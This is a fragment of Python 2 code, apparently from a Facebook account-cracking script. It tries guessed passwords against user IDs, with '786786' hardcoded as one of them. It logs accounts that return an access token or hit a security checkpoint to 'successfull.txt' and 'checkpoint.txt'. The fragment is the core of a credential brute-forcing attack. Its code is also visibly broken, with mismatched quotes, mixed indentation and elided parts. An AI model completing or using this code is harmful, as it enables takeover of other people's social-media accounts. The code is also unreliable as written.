	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				okb.write(k+c+user+'-•◈•-'+pass1+'b['name']\n')
				okb.close()
				oks.append(c+user+pass1+name)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[24 \x1b[1;93mHours \x1b[1;92m] ' + k + c + user + '  》 \x1b[1;97m ' + pass1+'\n'+ b['name']
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'b['name']\n')
					cps.close()
					cpb.append(c+user+pass1+name)
 				else:
 				    pass2="786786"
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        okb = open('save/successfull.txt', 'a')
 				        okb.write(k+c+user+'-•◈•-'+pass2+'b['name']\n')
 				        okb.close()
 				        oks.append(c+user+pass2+name)
 				    else:
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;97m[24 \x1b[1;93mHours \x1b[1;92m] ' + k + c + user + '\x1b[1;97m  》  ' + pass2+'\n'+ b['name']
 					        cps = open('save/checkpoint.txt', 'a')
 					        cps.write(k+c+user+'-•◈•-'+pass2+'b['name']\n')
 					        cps.close()
 					        cpb.append(c+user+pass2+name)
